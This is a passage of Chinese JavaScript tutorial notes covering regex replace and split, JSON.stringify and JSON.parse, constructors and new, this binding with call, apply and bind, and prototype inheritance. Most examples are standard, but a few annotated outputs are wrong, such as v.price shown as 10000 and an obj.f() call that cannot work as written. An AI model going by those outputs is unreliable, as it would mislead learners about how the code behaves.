replacement)：替换匹配的值。它接受两个参数，第一个是正则表达式，表示搜索模式，第二个是替换的内容。正则表达式如果不加g修饰符，就替换第一个匹配成功的值，否则替换所有匹配成功的值。'aaa'.replace('a', 'b') // "baa"'aaa'.replace(/a/g, 'b') // "bbb"// replace方法的一个应用，就是消除字符串首尾两端的空格。var str = ' #id div.class ';str.replace(/^\s+|\s+$/g, '') // "#id div.class"split(separator, [limit])：按照正则规则分割字符串，返回一个由分割后的各个部分组成的数组。该方法接受两个参数，第一个参数是正则表达式，表示分隔规则，第二个参数是返回数组的最大成员数。// 正则分隔，去除多余的空格，并指定返回数组的最大成员'a, b,c, d'.split(/, */, 2) [ 'a', 'b' ]// 预定义模式，某些常见模式的简写方式\d 匹配0-9之间的任一数字，相当于[0-9]。\D 匹配所有0-9以外的字符，相当于[^0-9]。\w 匹配任意的字母、数字和下划线，相当于[A-Za-z0-9_]。\W 除所有字母、数字和下划线以外的字符，相当于[^A-Za-z0-9_]。\s 匹配空格（包括换行符、制表符、空格符等），相等于[ \t\r\n\v\f]。\S 匹配非空格的字符，相当于[^ \t\r\n\v\f]。\b 匹配词的边界。\B 匹配非词边界，即在词的内部。如，/\bworld/.test('helloworld') // false// 量词符，用来设定某个模式出现的次数。? 问号，0次或1次，等同于&#123;0, 1&#125;* 星号，0次或多次，等同于&#123;0,&#125;+ 加号，1次或多次，等同于&#123;1,&#125; JSON 对象JSON 格式（JavaScript Object Notation）是一种用于数据交换的文本格式，2001年由 Douglas Crockford 提出，目的是取代繁琐笨重的 XML 格式。JSON 格式书写简单，一目了然；符合 JavaScript 原生语法，可以由解释引擎直接处理，不用另外添加解析代码。 JSON 对值的类型和格式有严格的规定。注意，null、空数组和空对象都是合法的 JSON 值。复合类型的值只能是数组或对象，不能是函数、正则表达式对象、日期对象。原始类型的值只有四种：字符串、数值（必须以十进制表示）、布尔值和null（不能使用NaN, Infinity, -Infinity和undefined）。字符串必须使用双引号表示，不能使用单引号。对象的键名必须放在双引号里面。数组或对象最后一个成员的后面，不能加逗号。 JSON对象是 JavaScript 的原生对象，用来处理 JSON 格式数据。它有两个静态方法：JSON.stringify()和JSON.parse()。 JSON.stringify() 方法用于将一个值转为 JSON 字符串。该字符串符合 JSON 格式，并且可以被JSON.parse方法还原。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768// 对于原始类型的字符串，转换结果会带双引号。因为将来还原的时候，内层双引号可以让引擎知道，这是一个字符串，而不是其他类型的值。JSON.stringify('abc') // ""abc""JSON.stringify([1, "false", false]) // "[1,"false",false]"JSON.stringify(&#123; name: "张三" &#125;) // "&#123;"name":"张三"&#125;"// 如果对象的属性是undefined、函数或 XML 对象，该属性会被JSON.stringify过滤。var obj = &#123;a: undefined, b: function () &#123;&#125;&#125;;JSON.stringify(obj) // "&#123;&#125;"// 如果数组的成员是undefined、函数或 XML 对象，则这些值被转成null。var arr = [undefined, function () &#123;&#125;];JSON.stringify(arr) // "[null,null]"// 正则对象会被转成空对象。JSON.stringify(/foo/) // "&#123;&#125;"// JSON.stringify方法会忽略对象enumerable为false的属性。var obj = &#123;&#125;;Object.defineProperties(obj, &#123; 'bar': &#123; value: 2, enumerable: false &#125;&#125;);JSON.stringify(obj); // "&#123;&#125;"// JSON.stringify方法还可以接受一个数组，作为第二个参数，指定需要转成字符串的属性。var obj = &#123; 'prop1': 'value1', 'prop2': 'value2', 'prop3': 'value3'&#125;;var selectedProperties = ['prop1', 'prop2'];JSON.stringify(obj, selectedProperties) // "&#123;"prop1":"value1","prop2":"value2"&#125;"// 这个类似白名单的数组，只对对象的属性有效，对数组无效。JSON.stringify(['a', 'b'], ['0']) // "["a","b"]"// 第二个参数还可以是一个函数，用来更改JSON.stringify的返回值。如果处理函数返回undefined或没有返回值，则该属性会被忽略。function f(key, value) &#123; if (typeof value === "number") &#123; value = 2 * value; &#125; return value;&#125;JSON.stringify(&#123; a: 1, b: 2 &#125;, f) // '&#123;"a": 2,"b": 4&#125;'// 还可以接受第三个参数，用于增加返回的 JSON 字符串的可读性。如果是数字，表示每个属性前面添加的空格（最多不超过10个）；如果是字符串（不超过10个字符），则该字符串会添加在每行前面。JSON.stringify(&#123; p1: 1, p2: 2 &#125;, null, 2); // "&#123; "p1": 1, "p2": 2 &#125;"// JSON.stringify发现参数对象有toJSON方法，就直接使用这个方法的返回值作为参数，而忽略原对象的其他参数。var user = &#123; firstName: '三', lastName: '张', get fullName()&#123; return this.lastName + this.firstName; &#125;, toJSON: function () &#123; return &#123; name: this.lastName + this.firstName &#125;; &#125;&#125;;JSON.stringify(user) // "&#123;"name":"张三"&#125;" 若没有 //toJSON方法，则为 "&#123;"firstName":"三","lastName":"张","fullName":"张三"&#125;"// Date对象就有一个自己的toJSON方法。var date = new Date('2015-03-05');date.toJSON() // "2015-03-05T00:00:00.000Z"JSON.stringify(date) // "2015-03-05T00:00:00.000Z"// toJSON方法的一个应用是，将正则对象自动转为字符串。因为JSON.stringify默认不能转换正则对象，但是设置了toJSON方法以后，就可以转换正则对象了。var obj = &#123;reg: /foo/&#125;;JSON.stringify(obj) // "&#123;"reg":&#123;&#125;&#125;" 不设置 toJSON 方法时RegExp.prototype.toJSON = RegExp.prototype.toString; JSON.stringify(/foo/) // ""/foo/"" 设置 toJSON 方法时 JSON.parse() 1234567891011121314151617181920// 方法用于将 JSON 字符串转换成对应的值JSON.parse('&#123;&#125;') // &#123;&#125;JSON.parse('&#123;"name": "张三"&#125;'); // &#123;name: "张三"&#125;// 如果传入的字符串不是有效的 JSON 格式，JSON.parse方法将报错。JSON.parse("'String'") // Uncaught SyntaxError: Unexpected token ' in JSON // 为了处理解析错误，可以将JSON.parse方法放在try...catch代码块中。try &#123; JSON.parse("'String'");&#125; catch(e) &#123; console.log('parsing error');&#125;// JSON.parse方法可以接受一个处理函数，作为第二个参数，用法与JSON.stringify方法类似。如，function f(key, value) &#123; if (key === 'a') &#123; return value + 10; &#125; return value;&#125;JSON.parse('&#123;"a": 1, "b": 2&#125;', f) // &#123;a: 11, b: 2&#125; 面向对象编程实例对象与 new 命令JavaScript 语言具有很强的面向对象编程能力，本章介绍 JavaScript 面向对象编程的基础知识。 对象是什么面向对象编程（Object Oriented Programming，OOP）是目前主流的编程范式。它将真实世界各种复杂的关系，抽象为一个个对象，然后由对象之间的分工与合作，完成对真实世界的模拟。 对象可以复用，通过继承机制还可以定制。因此，面向对象编程具有灵活、代码可复用、高度模块化等特点，容易维护和开发，比起由一系列函数或指令组成的传统的过程式编程（procedural programming），更适合多人合作的大型软件项目。 对象是单个实物的抽象。当实物被抽象成对象，实物之间的关系就变成了对象之间的关系，从而就可以模拟现实情况，针对对象进行编程。对象是一个容器，封装了属性（property）和方法（method）。属性是对象的状态，方法是对象的行为（完成某种任务）。 构造函数面向对象编程的第一步，就是要生成对象。对象是单个实物的抽象。通常需要一个模板，表示某一类实物的共同特征，然后对象根据这个模板生成。 典型的面向对象编程语言（比如 C++ 和 Java），都有“类”（class）这个概念。所谓“类”就是对象的模板，对象就是“类”的实例。但是，JavaScript 语言的对象体系，不是基于“类”的，而是基于构造函数（constructor）和原型链（prototype）。 JavaScript 语言使用构造函数（constructor）作为对象的模板。所谓”构造函数”，就是专门用来生成实例对象的函数。它就是对象的模板，描述实例对象的基本结构。一个构造函数，可以生成多个实例对象，这些实例对象都有相同的结构。12345// 构造函数就是一个普通的函数，但是有自己的特征和用法。var Vehicle = function () &#123; this.price = 10000; // 构造函数内部的this，代表了新生成的实例对象&#125;;// 上面代码中，Vehicle就是构造函数。为了与普通函数区别，构造函数名字的第一个字母通常大写。 构造函数的特点有两个: 函数体内部使用了this关键字，代表了所要生成的对象实例; 生成对象的时候，必须使用new命令。 new 命令new命令的作用，就是执行构造函数，返回一个实例对象。123456789101112131415161718192021222324252627282930313233// 使用new命令时，根据需要，构造函数也可以接受参数。var Vehicle = function (p) &#123; this.price = p; &#125;;var v = new Vehicle(1000);v.price // 10000// 如果忘了使用new命令,构造函数就变成了普通函数，并不会生成实例对象。this这时代表全局对象，将造成一些意想不到的结果。var v = Vehicle();v // undefinedprice // 1000// 为了保证构造函数必须与new命令一起使用，一个解决办法是，构造函数内部使用严格模式，即第一行加上use strict。// 由于严格模式中，函数内部的this不能指向全局对象，默认等于undefined，JavaScript 不允许对undefined添加属性,导致不加new调用会报错function Fubar(foo, bar)&#123; 'use strict'; this._foo = foo; this._bar = bar;&#125;Fubar() // Uncaught TypeError: Cannot set property '_foo' of undefined at Fubar// 另一个解决办法，构造函数内部判断是否使用new命令，如果发现没有使用，则直接返回一个实例对象。function Fubar(foo, bar) &#123; if (!(this instanceof Fubar)) &#123; return new Fubar(foo, bar); &#125; this._foo = foo; this._bar = bar;&#125;Fubar(1, 2)._foo // 1(new Fubar(1, 2))._foo // 1 new 命令的原理使用new命令时，它后面的函数依次执行下面的步骤。创建一个空对象，作为将要返回的对象实例。将这个空对象的原型，指向构造函数的prototype属性。将这个空对象赋值给函数内部的this关键字。开始执行构造函数内部的代码。 也就是说，构造函数内部，this指的是一个新生成的空对象，所有针对this的操作，都会发生在这个空对象上。构造函数之所以叫“构造函数”，就是说这个函数的目的，就是操作一个空对象（即this对象），将其“构造”为需要的样子。12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 如果构造函数内部有return语句，而且return后面跟着一个对象，new命令会返回return语句指定的对象；否则，就会不管return语句，返回this对象。var Vehicle = function () &#123; this.price = 1000; return 1000;&#125;;(new Vehicle()) === 1000 // false// 上面代码中，构造函数Vehicle的return语句返回一个数值。这时，new命令就会忽略这个return语句，返回“构造”后的this对象。// 但是，如果return语句返回的是一个跟this无关的新对象，new命令会返回这个新对象，而不是this对象。这一点需要特别引起注意。var Vehicle = function ()&#123; this.price = 1000; return &#123; price: 2000 &#125;;&#125;;(new Vehicle()).price // 2000// 上面代码中，构造函数Vehicle的return语句，返回的是一个新对象。new命令会返回这个对象，而不是this对象。// 另一方面，如果对普通函数（内部没有this关键字的函数）使用new命令，则会返回一个空对象。function getMessage() &#123; return 'this is a message';&#125;var msg = new getMessage();msg // getMessage &#123;&#125;// 上面代码中，getMessage是一个普通函数，返回一个字符串。对它使用new命令，会得到一个空对象。这是因为new命令总是返回一个对象，要么是实例对象，要么是return语句指定的对象。本例中，return语句返回的是字符串，所以new命令就忽略了该语句。// new命令简化的内部流程，可以用下面的代码表示。function _new(/* 构造函数 */ constructor, /* 构造函数参数 */ params) &#123; // 将 arguments 对象转为数组 var args = [].slice.call(arguments); // 取出构造函数 var constructor = args.shift(); // 创建一个空对象，继承构造函数的 prototype 属性 var context = Object.create(constructor.prototype); // 执行构造函数 var result = constructor.apply(context, args); // 如果返回结果是对象，就直接返回，否则返回 context 对象 return (typeof result === 'object' &amp;&amp; result != null) ? result : context;&#125;// 实例var actor = _new(Person, '张三', 28); new.target函数内部可以使用new.target属性。如果当前函数是new命令调用，new.target指向当前函数，否则为undefined。12345678910111213141516function f() &#123; console.log(new.target === f);&#125;f() // falsenew f() // true// 使用这个属性，可以判断函数调用的时候，是否使用new命令。function f() &#123; if (!new.target) &#123; throw new Error('请使用 new 命令调用！'); &#125; // ...&#125;f() // Uncaught Error: 请使用 new 命令调用！ Object.create() 创建实例对象构造函数作为模板，可以生成实例对象。但是，有时拿不到构造函数，只能拿到一个现有的对象。我们希望以这个现有的对象作为模板，生成新的实例对象，这时就可以使用Object.create()方法。12345678910111213var person1 = &#123; name: '张三', age: 38, greeting: function() &#123; console.log('Hi! I\'m ' + this.name + '.'); &#125;&#125;;var person2 = Object.create(person1);person2.name // 张三person2.greeting() // Hi! I'm 张三.// 上面代码中，对象person1是person2的模板，后者继承了前者的属性和方法。 this 关键字在JavaScript 中，一切皆对象，运行环境也是对象，所以函数都是在某个对象之中运行。 核心: this总是返回一个对象，this就是属性或方法“当前”所在的对象，即函数运行时所在的对象（环境）。 实质JavaScript 语言之所以有 this 的设计，跟内存里面的数据结构有关系。 12345678910111213141516171819202122232425262728293031var obj = &#123; foo: 5 &#125;;// 上面的代码将一个对象赋值给变量obj。JavaScript 引擎会先在内存里面，生成一个对象&#123; foo: 5 &#125;，然后把这个对象的内存地址赋值给变量obj。也就是说，变量obj是一个地址（reference）。后面如果要读取obj.foo，引擎先从obj拿到内存地址，然后再从该地址读出原始的对象，返回它的foo属性。// 原始的对象以字典结构保存，每一个属性名都对应一个属性描述对象。举例来说，上面例子的foo属性，实际上是以下面的形式保存的。foo属性的值保存在属性描述对象的value属性里面。&#123; foo: &#123; [[value]]: 5 [[writable]]: true [[enumerable]]: true [[configurable]]: true &#125;&#125;// 但是，属性的值也可能是一个函数。var obj = &#123; foo: function () &#123;&#125; &#125;;// 这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给foo属性的value属性&#123; foo: &#123; [[value]]: 函数的地址 ... &#125;&#125;// 由于函数是一个单独的值，函数可以在不同的运行环境（上下文）执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（context）。所以，this就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。var x = 1;var obj = &#123; f: f, x: 2 &#125;;var f = function () &#123; console.log(this.x); &#125;f() // 1 单独执行 obj.f() // 2 obj 环境执行 使用场合this主要有以下几个使用场合。全局环境、构造函数、对象的方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081// 全局环境。全局环境使用this，它指的就是顶层对象window。this === window // truefunction f() &#123; console.log(this === window);&#125;f() // true// 上面代码说明，不管是不是在函数内部，只要是在全局环境下运行，this就是指顶层对象window。// 构造函数。构造函数中的this，指的是实例对象。var Obj = function (p) &#123; this.p = p;&#125;;var o = new Obj('Hello World!');o.p // "Hello World!"// 上面代码定义了一个构造函数Obj。由于this指向实例对象，所以在构造函数内部定义this.p，就相当于定义实例对象有一个p属性。// 对象的方法。如果对象的方法里面包含this，this的指向就是方法运行时所在的对象。该方法赋值给另一个对象，就会改变this的指向。// 下面代码中，obj.foo方法执行时，它内部的this指向obj。var obj =&#123; foo: function () &#123; console.log(this); &#125;&#125;;obj.foo() // obj// 但是，下面这几种用法，都会改变this的指向。obj.foo就是一个值。这个值真正调用的时候，运行环境已经不是obj了，而是全局环境，所以this不再指向obj。// 情况一(obj.foo = obj.foo)() // window// 情况二(false || obj.foo)() // window// 情况三(1, obj.foo)() // window// 可以这样理解，JavaScript 引擎内部，obj和obj.foo储存在两个内存地址，称为地址一和地址二。obj.foo()这样调用时，是从地址一调用地址二，因此地址二的运行环境是地址一，this指向obj。但是，上面三种情况，都是直接取出地址二进行调用，这样的话，运行环境就是全局环境，因此this指向全局环境。// 如果this所在的方法不在对象的第一层，这时this只是指向当前一层的对象，而不会继承更上面的层。var a = &#123; p: 'Hello', b: &#123; m: function() &#123; console.log(this.p); &#125; &#125;&#125;;a.b.m() // undefined// 上面代码中，a.b.m方法在a对象的第二层，该方法内部的this不是指向a，而是指向a.b，因为实际执行的是下面的代码。var b = &#123; m: function() &#123; console.log(this.p); &#125;&#125;;var a = &#123; p: 'Hello', b: b&#125;;(a.b).m() // 等同于 b.m()// 如果要达到预期效果，只有写成下面这样。var a = &#123; b: &#123; m: function() &#123; console.log(this.p); &#125;, p: 'Hello' &#125;&#125;;// 如果这时将嵌套对象内部的方法赋值给一个变量，this依然会指向全局对象。var a = &#123; b: &#123; m: function() &#123; console.log(this.p); &#125;, p: 'Hello' &#125;&#125;;var hello = a.b.m;hello() // undefined// 上面代码中，m是多层对象内部的一个方法。为求简便，将其赋值给hello变量，结果调用时，this指向了顶层对象。为了避免这个问题，可以只将m所在的对象赋值给hello，这样调用时，this的指向就不会变。var hello = a.b;hello.m() // Hello 使用注意点 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 避免多层 this。由于this的指向是不确定的，所以切勿在函数中包含多层的this。var o = &#123; f1: function () &#123; console.log(this); // Object var f2 = function () &#123; console.log(this); // Window &#125;(); &#125;&#125;o.f1()// 上面代码包含两层this，结果运行后，第一层指向对象o，第二层指向全局对象，因为实际执行的是下面的代码。var temp = function () &#123; console.log(this);&#125;;var o = &#123; f1: function () &#123; console.log(this); var f2 = temp(); &#125;&#125;// 一个解决方法是在第二层改用一个指向外层this的变量。var o = &#123; f1: function() &#123; console.log(this); // Object var that = this; var f2 = function() &#123; console.log(that); // Object &#125;(); &#125;&#125;// 上面代码定义了变量that，固定指向外层的this，然后在内层使用that，就不会发生this指向的改变。// JavaScript 提供了严格模式，也可以硬性避免这种问题。严格模式下，如果函数内部的this指向顶层对象，就会报错。var counter = &#123; count: 0&#125;;counter.inc = function () &#123; 'use strict'; this.count++&#125;;var f = counter.inc;f() // Uncaught TypeError: Cannot read property 'count' of undefined at counter.inc// 上面代码中，inc方法通过'use strict'声明采用严格模式，这时内部的this一旦指向顶层对象，就会报错。// 此外，还要避免数组处理方法中的 this。数组的map和foreach方法，允许提供一个函数作为参数。这个函数内部不应该使用this。避免回调函数中的 this。 绑定 this 的方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899// JavaScript 提供了call、apply、bind这三个方法，来切换/固定this的指向。Function.prototype.call(thisValue, arg1, arg2, ...)var obj = &#123;&#125;;var f = function () &#123; return this;&#125;;f() === window // truef.call(obj) === obj // true// 上面代码中，全局环境运行函数f时，this指向全局环境（浏览器为window对象）；call方法可以改变this的指向，指定this指向对象obj，然后在对象obj的作用域中运行函数f。// call方法的参数，应该是一个对象。如果参数为空、null和undefined，则默认传入全局对象。// 如果call方法的参数是一个原始值，那么这个原始值会自动转成对应的包装对象，然后传入call方法。var f = function () &#123; return this;&#125;;f.call(5) // Number &#123;[[PrimitiveValue]]: 5&#125;Function.prototype.apply(thisValue, [arg1, arg2, ...])// apply方法的作用与call方法类似，也是改变this指向，然后再调用该函数。唯一的区别就是，它接收一个数组作为函数执行时的参数。function f(x, y)&#123; console.log(x + y);&#125;f.call(null, 1, 1) // 2f.apply(null, [1, 1]) // 2// 上面代码中，f函数本来接受两个参数，使用apply方法以后，就变成可以接受一个数组作为参数。// 利用这一点，可以做一些有趣的应用。// 找出数组最大元素。JavaScript 不提供找出数组最大元素的函数。结合使用apply方法和Math.max方法，就可以返回数组的最大元素。var a = [10, 2, 4, 15, 9];Math.max.apply(null, a) // 15// 将数组的空元素变为undefinedArray.apply(null, ['a', ,'b']) // [ 'a', undefined, 'b' ] 数组的forEach方法会跳过空元素，但是不会跳过undefined。// 转换类似数组的对象。利用数组对象的slice方法，可以将一个类似数组的对象（比如arguments对象）转为真正的数组。Array.prototype.slice.apply(&#123;0: 1, length: 2&#125;) // [1, undefined] 生效前提是被处理的对象必须有length属性，以及相对应的数字键。Function.prototype.bind()// bind方法用于将函数体内的this绑定到某个对象，然后返回一个新函数。var d = new Date();d.getTime() // 1551934555040var print = d.getTime;print() // Uncaught TypeError: this is not a Date object.// 上面代码中，我们将d.getTime方法赋给变量print，然后调用print就报错了。这是因为getTime方法内部的this，绑定Date对象的实例，赋给变量print以后，内部的this已经不指向Date对象的实例了。// bind方法可以解决这个问题。var print = d.getTime.bind(d); // bind方法将getTime方法内部的this绑定到d对象，这时就可以安全地将这个方法赋值给其他变量了。print() // 1551934555040 // bind方法的参数就是所要绑定this的对象，下面是一个更清晰的例子。var counter = &#123; count: 0, inc: function () &#123; this.count++; &#125;&#125;;var func = counter.inc.bind(counter); // counter.inc方法被赋值给变量func。这时必须用bind方法将inc内部的this，绑定到counter，否则就会出错。func();counter.count // 1// this绑定到其他对象也是可以的。var counter = &#123; count: 0, inc: function () &#123; this.count++; &#125;&#125;;var obj = &#123; count: 100&#125;;var func = counter.inc.bind(obj); // bind方法将inc方法内部的this，绑定到obj对象。结果调用func函数以后，递增的就是obj内部的count属性。func();obj.count // 101 // bind还可以接受更多的参数，将这些参数绑定原函数的参数。var add = function (x, y) &#123; return x * this.m + y * this.n;&#125;var obj = &#123; m: 2, n: 2 &#125;;var newAdd = add.bind(obj, 5); //bind方法除绑定this对象，还将add函数的第一个参数x绑定成5，返回一个新函数newAdd，新函数只要再接受一个参数y就能运行了newAdd(5) // 20// 如果bind方法的第一个参数是null或undefined，等于将this绑定到全局对象，函数运行时this指向顶层对象（浏览器为window）。function add(x, y) &#123; return x + y;&#125;var plus2 = add.bind(null, 2);plus2(8) // 10// 上面代码中，函数add内部并没有this，使用bind方法的主要目的是绑定参数x，以后每次运行新函数plus5，就只需要提供另一个参数y就够了。而且因为add内部没有this，所以bind的第一个参数是null，不过这里如果是其他对象，也没有影响。// 某些数组方法可以接受一个函数当作参数。这些函数内部的this指向，很可能会出错。var obj = &#123; name: '张三', times: [1, 2, 3], print: function () &#123; this.times.forEach(function (n) &#123; console.log(this.name); &#125;.bind(this)); &#125;&#125;;obj.print() // 张三 张三 张三// 上面代码中，obj.print内部this.times的this是指向obj的，这个没有问题。但是，forEach方法的回调函数内部的this.name却是指向全局对象，导致没有办法取到值。通过bind方法绑定this可以解决这个问题。 对象的继承大部分面向对象的编程语言，都是通过“类”（class）实现对象的继承。传统上，JavaScript 语言的继承不通过 class，而是通过“原型对象”（prototype）实现，本章介绍 JavaScript 的原型链继承。 原型对象概述 构造函数的缺点JavaScript 通过构造函数生成新对象，因此构造函数可以视为对象的模板。实例对象的属性和方法，可以定义在构造函数内部。1234567891011121314function Cat (name, color) &#123; this.name = name; this.color = color;&#125;var cat1 = new Cat('大毛', '白色');cat1.name // '大毛'cat1.color // '白色'// 上面代码中，Cat函数是一个构造函数，函数内部定义了name属性和color属性，所有实例对象（上例是cat1）都会生成这两个属性，即这两个属性会定义在实例对象上面。// 通过构造函数为实例对象定义属性，虽然很方便，但是有一个缺点。同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费。var cat2 = new Cat('二毛', '黑色');cat1.meow === cat2.meow // false// 上面代码中，cat1和cat2是同一个构造函数的两个实例，它们都具有meow方法。由于meow方法是生成在每个实例对象上面，所以两个实例就生成了两次。 也就是说，每新建一个实例，就会新建一个meow方法。这既没有必要，又浪费系统资源，因为所有meow方法都是同样的行为，完全应该共享。 这个问题的解决方法，就是 JavaScript 的原型对象（prototype）。 prototype 属性的作用JavaScript 继承机制的设计思想就是，原型对象的所有属性和方法，都能被实例对象共享。也就是说，如果属性和方法定义在原型上，那么所有实例对象就能共享，不仅节省了内存，还体现了实例对象之间的联系。 每个函数都有一个prototype(原型)属性，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。对于普通函数来说，该属性基本无用。但是，对于构造函数来说，生成实例的时候，该属性会自动成为实例对象的原型。1234567891011121314// 下面代码中，构造函数Animal的prototype属性，就是实例对象cat1和cat2的原型对象。原型对象上添加一个color属性，结果，实例对象都共享了该属性。function Animal(name) &#123; this.name = name;&#125;Animal.prototype.color = 'white';var cat1 = new Animal('大毛');var cat2 = new Animal('二毛');cat1.color // 'white'cat2.color // 'white'// 原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在所有实例对象上。Animal.prototype.color = 'yellow';cat1.color // "yellow"cat2.color // "yellow"// 这是因为实例对象其实没有color属性，都是读取原型对象的color属性。也就是说，当实例对象本身没有某个属性或方法的时候，它会到原型对象去寻找该属性或方法。这就是原型对象的特殊之处。如果实例对象自身就有某个属性或方法，它就不会再去原型对象寻找这个属性或方法。 总结一下，原型对象的作用，就是定义所有实例对象共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。 原型链JavaScript 规定，所有对象都有自己的原型对象（prototype）。一方面，任何一个对象，都可以充当其他对象的原型；另一方面，由于原型对象也是对象，所以它也有自己的原型。因此，就会形成一个“原型链”（prototype chain）：对象到原型，再到原型的原型…… 如果一层层地上溯，所有对象的原型最终都可以上溯到Object.prototype，即Object构造函数的prototype属性。也就是说，所有对象都继承了Object.prototype的属性。这就是所有对象都有valueOf和toString方法的原因，因为这是从Object.prototype继承的。 那么，Object.prototype对象有没有它的原型呢？回答是Object.prototype的原型是null。null没有任何属性和方法，也没有自己的原型。因此，原型链的尽头就是null。12Object.getPrototypeOf(Object.prototype) // null// Object.getPrototypeOf方法返回参数对象的原型 constructor 属性prototype对象有一个constructor属性，默认指向prototype对象所在的构造函数。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function P() &#123;&#125;P.prototype.constructor === P // true// 由于constructor属性定义在prototype对象上面，意味着可以被所有实例对象继承。function P() &#123;&#125;var p = new P();p.constructor === P // truep.constructor === P.prototype.constructor // truep.hasOwnProperty('constructor') // false// 上面代码中，p是构造函数P的实例对象，但是p自身没有constructor属性，该属性其实是读取原型链上面的P.prototype.constructor属性。// constructor属性的作用是，可以得知某个实例对象，到底是哪一个构造函数产生的。function F() &#123;&#125;;var f = new F();f.constructor === F // truef.constructor === RegExp // false// 上面代码中，constructor属性确定了实例对象f的构造函数是F，而不是RegExp。// 另一方面，有了constructor属性，就可以从一个实例对象新建另一个实例。function Constr() &#123;&#125;var x = new Constr();var y = new x.constructor();y instanceof Constr // true// 上面代码中，x是构造函数Constr的实例，可以从x.constructor间接调用构造函数。这使得在实例方法中，调用自身的构造函数成为可能。// constructor属性表示原型对象与构造函数之间的关联关系，如果修改了原型对象，一般会同时修改constructor属性，防止引用的时候出错。function Person(name) &#123; this.name = name;&#125;Person.prototype.constructor === Person // truePerson.prototype = &#123; method: function () &#123;&#125;&#125;;Person.prototype.constructor === Person // falsePerson.prototype.constructor === Object // true// 上面代码中，构造函数Person的原型对象改掉了，但是没有修改constructor属性，导致这个属性不再指向Person。由于Person的新原型是一个普通对象，而普通对象的constructor属性指向Object构造函数，导致Person.prototype.constructor变成了Object。// 所以，修改原型对象时，一般要同时修改constructor属性的指向。// 坏的写法C.prototype = &#123; method1: function (...) &#123; ... &#125;&#125;;// 好的写法C.prototype = &#123; constructor: C, method1: function (...) &#123; ... &#125;&#125;;// 更好的写法C.prototype.method1 = function (...) &#123; ... &#125;;// 上面代码中，要么将constructor属性重新指向原来的构造函数，要么只在原型对象上添加方法，这样可以保证instanceof运算符不会失真。// 如果不能确定constructor属性是什么函数，还有一个办法：通过name属性，从实例得到构造函数的名称。function Foo() &#123;&#125;var f = new Foo();f.constructor.name // "Foo" instanceof 运算符instanceof运算符返回一个布尔值，表示对象是否为某个构造函数的实例。12345678910111213141516171819202122232425262728293031323334var v = new Vehicle();v instanceof Vehicle // true// instanceof运算符的左边是实例对象，右边是构造函数。它会检查右边构建函数的原型对象（prototype），是否在左边对象的原型链上。因此，上面的写法和下面是等同的。Vehicle.prototype.isPrototypeOf(v)// 有一种特殊情况，就是左边对象的原型链上，只有null对象。这时，instanceof判断会失真。var obj = Object.create(null);typeof obj // "object"obj instanceof Object // false// instanceof运算符的一个用处，是判断值的类型。var x = [1, 2, 3];var y = &#123;&#125;;x instanceof Array // truey instanceof Object // true// 注意，instanceof运算符只能用于对象，不适用原始类型的值。var s = 'hello';s instanceof String // false 字符串不是String对象的实例（因为字符串不是对象），所以返回false// 此外，对于undefined和null，instanceOf运算符总是返回false。undefined instanceof Object // falsenull instanceof Object // false// 利用instanceof运算符，还可以巧妙地解决，调用构造函数时，忘了加new命令的问题。function Fubar (foo, bar) &#123; if (this instanceof Fubar) &#123; this._foo = foo; this._bar = bar; &#125; else &#123; return new Fubar(foo, bar); &#125;&#125;// 上面代码使用instanceof运算符，在函数体内部判断this关键字是否为构造函数Fubar的实例。如果不是，就表明忘了加new命令。 构造函数的继承让一个构造函数继承另一个构造函数，是非常常见的需求。这可以分成两步实现。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// 第一步是在子类的构造函数中，调用父类的构造函数。function Sub(value) &#123; Super.call(this); this.prop = value;&#125;// 上面代码中，Sub是子类的构造函数，this是子类的实例。在实例上调用父类的构造函数Super，就会让子类实例具有父类实例的属性。// 第二步，是让子类的原型指向父类的原型，这样子类就可以继承父类原型。Sub.prototype = Object.create(Super.prototype);Sub.prototype.constructor = Sub;Sub.prototype.method = '...';// 上面代码中，Sub.prototype是子类的原型，要将它赋值为Object.create(Super.prototype)，而不是直接等于Super.prototype。否则后面两行对Sub.prototype的操作，会连父类的原型Super.prototype一起修改掉。// 另外一种写法是Sub.prototype等于一个父类实例。Sub.prototype = new Super();// 上面这种写法也有继承的效果，但是子类会具有父类实例的方法。有时，这可能不是我们需要的，所以不推荐使用这种写法。// 举例来说，下面是一个Shape构造函数。function Shape() &#123; this.x = 0; this.y = 0;&#125;Shape.prototype.move = function (x, y) &#123; this.x += x; this.y += y; console.info('Shape moved.');&#125;;// 我们需要让Rectangle构造函数继承Shape。// 第一步，子类继承父类的实例function Rectangle() &#123; Shape.call(this); // 调用父类构造函数&#125;// 另一种写法function Rectangle() &#123; this.base = Shape; this.base();&#125;// 第二步，子类继承父类的原型Rectangle.prototype = Object.create(Shape.prototype);Rectangle.prototype.constructor = Rectangle;// 采用这样的写法以后，instanceof运算符会对子类和父类的构造函数，都返回true。var rect = new Rectangle();rect instanceof Rectangle // truerect instanceof Shape // true// 上面代码中，子类是整体继承父类。有时只需要单个方法的继承，这时可以采用下面的写法。ClassB.prototype.print = function() &#123; ClassA.prototype.print.call(this); // ...&#125;// 上面代码中，子类B的print方法先调用父类A的print方法，再部署自己的代码。这就等于继承了父类A的print方法。 多重继承JavaScript 不提供多重继承功能，即不允许一个对象同时继承多个对象。但是，可以通过变通方法，实现这个功能。12345678910111213141516171819202122232425function M1() &#123; this.hello = 'hello';&#125;function M2() &#123; this.world = 'world';&#125;function S() &#123; M1.call(this); M2.call(this);&#125;// 继承 M1S.prototype = Object.create(M1.prototype);// 继承链上加入 M2Object.assign(S.prototype, M2.prototype);// 指定构造函数S.prototype.constructor = S;var s = new S();s.hello // 'hello's.world // 'world'// 